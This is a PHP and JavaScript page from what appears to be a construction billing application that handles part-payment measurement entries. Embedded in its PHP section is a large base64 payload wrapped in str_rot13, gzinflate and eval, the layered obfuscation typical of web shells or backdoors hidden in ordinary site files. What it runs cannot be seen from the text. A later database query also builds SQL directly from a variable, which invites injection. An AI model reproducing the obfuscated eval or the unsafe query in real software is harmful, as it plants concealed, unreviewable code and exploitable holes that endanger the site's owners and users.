							txt_box3.style.pointerEvents = "none";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_percent_dpm";
							txt_box4.id = "txt_partpay_percent_dpm"+index;
							txt_box4.value = Number(percent);
							txt_box4.style.width = 35+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						var cell5=row.insertCell(4);
							cell5.setAttribute('class', "dynamicrowcell");	
							cell5.style.padding = "0px 0px 0px 0px";
						var txt_box5 = document.createElement("input");
							txt_box5.name = "txt_partpay_amt_dpm";
							txt_box5.id = "txt_partpay_amt_dpm"+index;
							txt_box5.value = Number(amount).toFixed(2);
							txt_box5.style.width = 110+"px";
							txt_box5.style.textAlign = "right";
							txt_box5.style.pointerEvents = "none";
							txt_box5.setAttribute('class', "dynamictextbox"); 
							cell5.appendChild(txt_box5);
							
						var cell6=row.insertCell(5);
							cell6.setAttribute('class', "dynamicrowcell");	
							cell6.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box6 = document.createElement("input");
								txt_box6.name = "txt_percent_dpm_payable";
								txt_box6.id = "txt_percent_dpm_payable"+index;
								txt_box6.value = Number(PayableDpmSlmPercent);
								txt_box6.style.width = 35+"px";
								txt_box6.style.border = "1px solid #2aade4";
								txt_box6.style.backgroundColor = "#ffffff";
								txt_box6.style.textAlign = "right";
								txt_box6.setAttribute('class', "dynamictextbox");
								txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index); 
								cell6.appendChild(txt_box6);
						}
						else
						{
							cell6.innerHTML = "";
						}
							
						var cell7=row.insertCell(6);
							cell7.setAttribute('class', "dynamicrowcell");	
							cell7.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box7 = document.createElement("input");
								txt_box7.name = "txt_amt_dpm_payable[]";
								txt_box7.id = "txt_amt_dpm_payable"+index;
								txt_box7.value = Number(PayableSlmDpmAmt).toFixed(2);
								txt_box7.style.width = 110+"px";
								txt_box7.style.textAlign = "right";
								txt_box7.style.pointerEvents = "none";
								txt_box7.setAttribute('class', "dynamictextbox"); 
								cell7.appendChild(txt_box7);
						}
						else
						{
							cell7.innerHTML = "";
						}
						
						var txt_box8 = document.createElement("input");
							txt_box8.type = "hidden";
							txt_box8.id = "hid_dpm_result"+index;
							txt_box8.name = "hid_dpm_result[]";
							txt_box8.value = result;
							txt_box8.setAttribute('class', "dynamictextbox");
							txt_box8.style.width = 70+"px";
							txt_box8.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box8);
							
						var txt_box9 = document.createElement("input");
							txt_box9.type = "hidden";
							txt_box9.id = "hid_dpm_mbid"+index;
							txt_box9.name = "hid_dpm_mbid";
							txt_box9.value = measurementbookid;
							txt_box9.setAttribute('class', "dynamictextbox");
							txt_box9.style.width = 70+"px";
							txt_box9.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box9);
						index++;	
					}
					document.getElementById("txt_partpay_total_paidamt_dpm").value = Number(TotalPaidDpmAmount).toFixed(2);
					document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(TotalPayableDpmAmount).toFixed(2);
				}
				
			}
		}
		xmlHttp.send(strURL);	
	}
	
	function getSLMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp; 
		var data;
		var i, rbn, qty, percent, newrow = "", amt;
		var slmitemQty = document.getElementById("hid_slm_qty").value;
		if(Number(slmitemQty) == 0)
		{
			document.getElementById("rowid0").className = "hide";
		}
		else
		{
			document.getElementById("rowid0").className = "";
		}
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_slm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText; 
				if(data != "")
				{
					
					var x = Number(document.getElementById("table4").rows.length);
					var index = x;
					var Splitdata = data.split("@@");
					var SlmRemarks = Splitdata[1];
					var SlmDetails = Splitdata[0];
					var details = SlmDetails.split("*");
					for(i=0; i<details.length; i+=3)
					{
						//var arr = index;
						var arg = "X"+"*"+index;
							rbn 	= details[i];
							qty 	= details[i+1];
							percent = details[i+2];
							var result = percent+"*"+rbn+"*"+qty+"*"+itemid;
							amt 	= Number(qty)*Number(rate)*Number(percent)/100;
						var table=document.getElementById("table4");
						var row=table.insertRow(table.rows.length-2);
							row.id = "rowid"+index;
							row.style.align = "center";
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "dynamicrowcell");
							cell1.style.padding = "0px 0px 0px 0px";
								
						var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_partpay_qty_slm[]";
							txt_box1.id = "txt_partpay_qty_slm"+index;
							txt_box1.value = Number(qty);
							txt_box1.style.width = 93+"px";
							txt_box1.style.border = "1px solid #2aade4";
							txt_box1.style.textAlign = "right";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm");
												};
											})(index);
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_item_rate_slm";
							txt_box2.id = "txt_item_rate_slm"+index;
							txt_box2.value = Number(rate).toFixed(2);
							txt_box2.style.textAlign = "right";
							txt_box2.style.width = 80+"px";
							txt_box2.readOnly = true;
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm");
												};
											})(index);
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_partpay_percent_slm";
							txt_box3.id = "txt_partpay_percent_slm"+index;
							txt_box3.value = percent;
							txt_box3.style.width = 40+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.border = "1px solid #2aade4";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							txt_box3.onblur= (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm");
												ValidatePercent(this,"slm",ind);
												};
											})(index);
											
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_amt_slm[]";
							txt_box4.id = "txt_partpay_amt_slm"+index;
							txt_box4.value = Number(amt).toFixed(2);
							txt_box4.style.width = 130+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						
						if(i == 0)
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var addbtn=document.createElement("input");
								addbtn.type = "button";
								addbtn.value = " + ";
								addbtn.id = "btn_add_row_slm"+index;
								addbtn.name = "btn_add_row_slm";
								addbtn.setAttribute('class', "delbtnstyle");
								addbtn.style.width = 32+"px";
								addbtn.style.borderRadius = 0+"px";
								addbtn.onclick = function () {
												  addRow()
												}
								cell5.appendChild(addbtn);
						
						
						}
						else
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var delbtn=document.createElement("input");
								delbtn.type = "button";
								delbtn.value = " X ";
								delbtn.id = "btn_delete"+index;
								delbtn.name = "btn_delete";
								delbtn.setAttribute('class', "delbtnstyle");
								delbtn.style.width = 32+"px";
								delbtn.style.borderRadius = 0+"px";
								delbtn.onclick = (function (ind) {
												  //deleteRow(row.id)
												  	return function() {
													deleteRow(this);
													};
												})(index);
								cell5.appendChild(delbtn);
						}	
						
							//var cell6=row.insertCell(5);
							//cell5.style.width = 10+"px";
							//cell6.style.textAlign = "center";
							//cell6.style.padding = "0px 0px 0px 0px";
							//cell6style.visibility = "hidden";	
							
					// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
						var txt_box5 = document.createElement("input");
							txt_box5.type = "hidden";
							txt_box5.id = "hid_slm_result"+index;
							txt_box5.name = "hid_slm_result[]";
							txt_box5.value = result;
							txt_box5.setAttribute('class', "dynamictextbox");
							txt_box5.style.width = 70+"px";
							txt_box5.style.borderRadius = 0+"px";
							cell5.appendChild(txt_box5);
							index++;
						var elmt = document.getElementById("rowid0");
							elmt.style.display = "none";
							totalAmountCalculation("slm");
						//index++;
							result = "";
					}
					if(SlmRemarks != "")
					{
						document.getElementById("txt_slm_remarks").value = SlmRemarks;
					}
					else
					{
						document.getElementById("txt_slm_remarks").value = "";
					}
				}totalAmountCalculation("slm");
					//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);

			}
		}
		xmlHttp.send(strURL);	
	}
	
	function saveDataDetails()
	{
		var result1 = "X";
		$('input[name="hid_slm_result[]"]').each(function() {
			var res1 = $(this).val();
			if(res1 != "")
			{
				result1 = res1 + "@"+ result1;
			}
		});
		
		var result2 = "Y";
		$('input[name="hid_dpm_result[]"]').each(function() {
			var res2 = $(this).val();
			result2 = res2 + "@"+ result2;
		});
		//alert(result1)
		//alert(result2)
		var result = result1 + "###" + result2;
		//alert(result);
		var itemid = document.getElementById("txt_item_id").value;
		var itemStr = document.getElementById("hid_item_str"+itemid).value;
		var SlmRemarks = document.getElementById("txt_slm_remarks").value;
		var DpmRemarks = document.getElementById("txt_dpm_remarks").value;
		var RemarksStr = SlmRemarks + "*" + DpmRemarks;
		//alert(itemStr);
		var sheetid = document.getElementById("txt_sheet_id").value;
		$.post("Partpayment_Update.php", {resultdata: result, sheetid: sheetid, itemStr: itemStr, RemarksStr: RemarksStr}, function (data) {
		//alert(data);
			if(data == 1)
			{
				
				//swal("", "Sucessfully Updated...!", "success");
				location.reload();
				//$.modal.close();
				
			}
        });
		
	}
	
	function ShowRemarks(id)
	{
		var idcount = id;
		var RemarksData = document.getElementById("hid_dpm_remarkdata"+idcount).value;
		swal({
		title: "<small>Deduct Previous Measurement Remarks</small>",
		text: "<small>"+RemarksData+"</small>",
		html: true
	});
	}
	
	function SaveData()
	{
		var temp = 0; var temp2 = 0;
		var ActualSlmQty = $("#hid_slm_qty").val();
		var TotalPpayQty = 0;
		if((ActualSlmQty != "")&&(Number(ActualSlmQty) != 0)){
			$('input[name="txt_partpay_qty_slm[]"]').each(function() {
				var PpayQty = $(this).val();
				if(PpayQty != ""){
					temp2++;
				}
				if((PpayQty != "")&&(Number(PpayQty) != 0)){
					TotalPpayQty = TotalPpayQty + Number(PpayQty);
				}
			});
			if((ActualSlmQty != TotalPpayQty)&&(temp2 > 0)){
				temp = 1;
			}
		}
		if(temp == 1){
			swal("Total part payment qty should be equal to Since Last Measurement Qty.");
		}else{
			swal({   title: "Are you sure?",   
				text: "You want to update this data..?!",   
				type: "warning",   
				showCancelButton: true,   
				confirmButtonColor: "#DD6B55",   
				confirmButtonText: "Yes, Update!",   
				cancelButtonText: "No, Cancel!",   
				closeOnConfirm: false,   
				closeOnCancel: false }, 
				function(isConfirm){   
				if (isConfirm) 
				{     
					saveDataDetails();  
				} 
				else 
				{     
					swal("Cancelled", "Your data not updated:)", "error");   
				} 
			});
		}
	}
	function CancelData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to Cancel this operation..?!",   
			type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Cancel!",   
			cancelButtonText: "No, Stay on this!",   
			closeOnConfirm: true,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{   
				  
				$.modal.close();  
			} 
			else 
			{     
				swal({   
				title: "Please Wait!",   
				text: "Your Page will be redirected..",   
				timer: 2000,   showConfirmButton: false 
				});
			} 
		});
	}
	jQuery(function ($) 
	{
	// Load dialog on click
		$('input[name="check"]').click(function (e) 
		{
			if($(this).is(':checked'))
			{
				// THIS PART IS FOR SINCE LAST MEASUREMENT SECTION //
				var SlmTotalAmount = 0, DpmPayableAmount = 0;
				var itemdetails = this.value;
				var split_itemdetails = itemdetails.split("*");
				var subdivid 	= split_itemdetails[0];
				var subdivname 	= split_itemdetails[1];
				var description = split_itemdetails[2];
				var slm_qty		= Number(split_itemdetails[3]);
				var dpm_qty		= Number(split_itemdetails[4]);
				var rate 		= Number(split_itemdetails[5]); 
				var itemunit	= split_itemdetails[6];
				var sheetid		= split_itemdetails[7];
					document.getElementById("txt_item_no").value = subdivname;
					document.getElementById("txt_item_id").value = subdivid;
					document.getElementById("txt_item_desc").value = description;
					document.getElementById("txt_slm_qty").value = slm_qty.toFixed(3)+" "+itemunit;
					document.getElementById("txt_dpm_qty").value = dpm_qty.toFixed(3)+" "+itemunit;
					document.getElementById("txt_item_rate_slm0").value = rate.toFixed(2);
					document.getElementById("hid_slm_qty").value = slm_qty.toFixed(3);
					//var tablerow;
					//tablerow = "<tr><td>"+subdivname+"</td><td>"+description+"</td></tr>";
					//$('#table2 tr:last').after(tablerow);
					
				// THIS PART IS FOR DEDUCT PREVIOUS MEASUREMENT SECTION //
				getDPMdetaiils(sheetid,subdivid,rate);
				getSLMdetaiils(sheetid,subdivid,rate);
				
				//SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
				//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//alert(SlmTotalAmount);
				//alert(DpmPayableAmount);
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
				
				$('#basic-modal-content').modal();
				
			}
			//return false;
		});
		
		$('#btn_save').click(function (e) 
		{
			if($('#table2 tr').size()>1)
			{
				//$('#table2 tr:last-child').remove();
				var temp = 1;
			}
			/*if(temp == 1)
			{
				$.modal.close();
				}*/
			
		});
		
	});
</script>
<style>
.pagetitle
{
	text-shadow:
    -1px -1px 0 #7F7F7F,
    1px -1px 0 #7F7F7F,
    -1px 1px 0 #7F7F7F,
    1px 1px 0 #7F7F7F; 
}
.table1
{
	color:#BF0602;
	/*color:#921601;*/
	border: 1px solid #959595;
	border-collapse: collapse;
}
.table1 td
{ 
	border: 1px solid #959595;
	border-collapse: collapse;
}
.fontcolor1
{
	color:#FFFFFF;
}

.popuptitle
{
	background-color:#0080FF;
	font-weight:bold;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:14px;
	color:#FFFFFF;
	line-height:25px;
	border:1px solid #9b9da0;
}
.table2
{
	color:#071A98;
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.table2 td
{
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.bottomsection
{
 	position: absolute;
    bottom: 0;
	width:100%;
	line-height:38px;
}
.buttonsection
{
	display: inline-block;
	line-height:38px;
}
.buttonstyle
{
	background-color:#0080FF;
	width:80px;
	height:25px;
	color:#FFFFFF;
	-moz-box-shadow: 0px 1px 0px 0px #0080FF;
	-webkit-box-shadow: 0px 1px 0px 0px #0080FF;
	box-shadow: 0px 1px 0px 0px #0080FF;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #0080FF), color-stop(1, #0080FF));
	background:-moz-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-webkit-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-o-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-ms-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:linear-gradient(to bottom, #0080FF 5%, #0080FF 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0080FF', endColorstr='#0080FF',GradientType=0);
	border:1px solid #0080FF;
	display:inline-block;
	cursor:pointer;
	font-weight:bold;

}
.buttonstyle:hover
{
	font-size:14px;
	padding: 0.1em 1em;
	-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    -webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    box-shadow:0px 1px 4px rgba(0,0,0,5);
	background:#E80017;
	border:1px solid #E80017;
}
.popuptextbox
{
	border:none;
	font-family:Verdana;
	font-size:12px;
	font-weight:bold;
	color:#DE0117;
	text-align:center;
	pointer-events: none;
}
.dynamictextbox
{
	border:1px solid #ffffff;
	height:21px;
	color:#DE0117;
	font-weight:bold;
}
.dynamictextbox:hover, .dynamictextbox:focus
{
	/*outline: none;*/
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;
    /*border-color: #9ecaed;
    box-shadow: 0 0 10px #9ecaed;*/
}
.dynamictextbox2
{
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;	
}
.dynamicrowcell
{
	padding-bottom:0px;
	padding-top:0px; 
	padding-left:0px; 
	padding-right:0px;
	text-align:right;
	font:Verdana, Arial, Helvetica, sans-serif;
}
.hide
{
	display:none;
}
.labelprint
{
	font-weight:normal;
	color:#000000;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:10pt;
}
@media print 
{
	.printbutton
	{
		display: none !important;
	}
}
/*.table1 tr:nth-child(even) {background: #CCC}
.table1 tr:nth-child(odd) {background: #FFF}*/
</style>		
<body bgcolor="" onload="setRowSpan();noBack();" onpageshow="if (event.persisted) noBack();" onUnload="" style="padding:0; margin:0;">
<!--<table width="1087px" height="56px" align="center" class='label' bgcolor="#0A9CC5">
	<tr bgcolor="#0A9CC5" style="position:fixed;">
		<td style="color:#FFFFFF; border:none; font-size:16px;" width="1077px"  height="48px" class="pagetitle" align="center">ABSTRACT MEASUREMENT BOOK - PART PAYMENT</td>
	</tr>
</table>-->
<form name="form" method="post" onsubmit="return confirm('Do you really want to submit the Book?');">
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

?>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor="#FFFFFF" id="table1">
<?php echo $tablehead; ?>
<!--<tr bgcolor="#d4d8d8" style="height:5px"><td colspan="13" style="border-top-color:#666666; border-bottom-color:#666666;height:5px"></td></tr>-->
<?php 
//$Line = $Line+2;

include('CementVariationAmt.php');
include('SupplementAgmtRebate.php');

$color_var = 0; $table_group_row = 0; $temp_array = array(); $OverAllDpmAmount = 0; $OverAllSlmDpmAmount = 0; $OverAllSlmDpmAmount = 0; $SubdividDpmStr = ""; $RebateCalcFlag = 0;

$QSPPMasterArr = array(); $QSPPMasterMbIdArr = array();
$QSPPSLMMasterArr = array(); $QSPPSLMMasterMbIdArr = array();
$QSPPDPMMasterArr = array(); $QSPPDPMMasterMbIdArr = array();
$QSPPRefMBPageArr = array();
$SelectQtySplitQuery = "select * from pp_qty_splt where sheetid = '$abstsheetid'";
$SelectQtySplitSql = mysql_query($SelectQtySplitQuery);
if($SelectQtySplitSql == true){
